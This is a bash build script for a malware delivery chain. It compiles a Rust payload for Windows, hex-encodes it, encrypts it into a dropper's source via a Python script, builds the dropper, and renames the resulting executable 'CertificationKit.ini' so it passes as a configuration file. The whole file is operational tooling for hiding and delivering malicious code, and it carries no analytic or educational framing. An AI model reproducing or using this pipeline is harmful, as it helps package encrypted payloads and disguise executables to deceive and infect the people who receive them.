# chmod +x build.sh && ./build.sh 

set -euo pipefail

PROJECT_DIR="reddit"
DROPPER_DIR="../dropper"
TARGET="x86_64-pc-windows-gnu"
OUTPUT_EXE="reddit.exe"
HEX_FILE="reddit.hex"
RUST_ARRAY_FILE="main.rs"
ENCRYPT_SCRIPT="encrypt.py"
FINAL_NAME="CertificationKit.ini"

cd "$PROJECT_DIR" || { echo "Error: directory $PROJECT_DIR not found" >&2; exit 1; }

cargo build --target "$TARGET" --release >/dev/null 2>&1 || { echo "Error: failed to build payload" >&2; exit 1; }

cp "target/$TARGET/release/$OUTPUT_EXE" . || { echo "Error: failed to copy $OUTPUT_EXE" >&2; exit 1; }

xxd -p "$OUTPUT_EXE" | tr -d '\n' > "$HEX_FILE" || { echo "Error: failed to create hex file" >&2; exit 1; }

python3 "$ENCRYPT_SCRIPT" > "$DROPPER_DIR/src/$RUST_ARRAY_FILE" || { echo "Error: encrypt.py failed" >&2; exit 1; }

cd "$DROPPER_DIR" || { echo "Error: directory dropper not found" >&2; exit 1; }

cargo build --target "$TARGET" --release >/dev/null 2>&1 || { echo "Error: failed to build dropper" >&2; exit 1; }

cp "target/$TARGET/release/dropper.exe" "../$FINAL_NAME" || { echo "Error: failed to copy dropper.exe → $FINAL_NAME" >&2; exit 1; }

echo "Done → $(realpath "../$FINAL_NAME")"
